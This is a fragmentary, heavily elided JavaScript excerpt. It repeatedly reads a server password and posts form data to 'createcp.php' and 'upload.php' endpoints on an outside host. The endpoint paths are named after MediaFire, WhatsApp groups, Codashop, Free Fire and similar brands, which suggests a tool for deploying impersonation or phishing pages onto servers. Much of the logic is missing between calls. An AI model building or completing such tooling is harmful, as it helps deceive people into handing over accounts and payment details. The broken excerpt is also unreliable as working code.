...
break
        ...
        proot = server[0].password
         ...
         request.post({
             url: 'https://apinihbos.terbarru.me/api-webp/mediafire/createcp.php',
             form: inputt
         }, function (error, response, body) {
    ...
    console.log(body)
             if (afakahinijson(body)) {
                 ...
                 request.post({
                     url: 'https://apinihbos.terbarru.me/api-webp/mediafire/upload.php',
                     form: inputt
  ...
  break
        ...
        request.post({
            url: 'https://apinihbos.terbarru.me/api-webp/mediafire2/createcp.php',
            form: inputt
        }, function (error, response, body) {
...
// console.log(body)
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://apinihbos.terbarru.me/api-webp/mediafire2/upload.php',
                    form: inputt
                }, function (error, res, body) {
...
break
        ...
        request.post({
            url: 'https://apinihbos.terbarru.me/api-webp/simontok/createcp.php',
            form: inputt
        }, function (error, response, body) {
...
// console.log(body)
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://apinihbos.terbarru.me/api-webp/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
...
break
        ...
        request.post({
            url: 'https://apinihbos.terbarru.me/api-webp/grupwa/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://apinihbos.terbarru.me/api-webp/grupwa/upload.php',
                    form: inputt
                }, function (error, res, body) {
...
break
        ...
        request.post({
            url: 'https://apinihbos.terbarru.me/api-webp/grupwa2/createcp.php',
            form: inputt
        }, function (error, response, body) {
...
// console.log(body)
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://apinihbos.terbarru.me/api-webp/grupwa2/upload.php',
                    form: inputt
                }, function (error, res, body) {
...
break
        ...
        request.post({
            url: 'https://apinihbos.terbarru.me/api-webp/codashop/createcp.php',
            form: inputt
        }, function (error, response, body) {
...
// console.log(body)
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://apinihbos.terbarru.me/api-webp/codashop/upload.php',
                    form: inputt
                }, function (error, res, body) {
...
// console.log(body)
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://apinihbos.terbarru.me/api-webp/freefire/upload.php',
                    form: inputt
                }, function (error, res, body) {
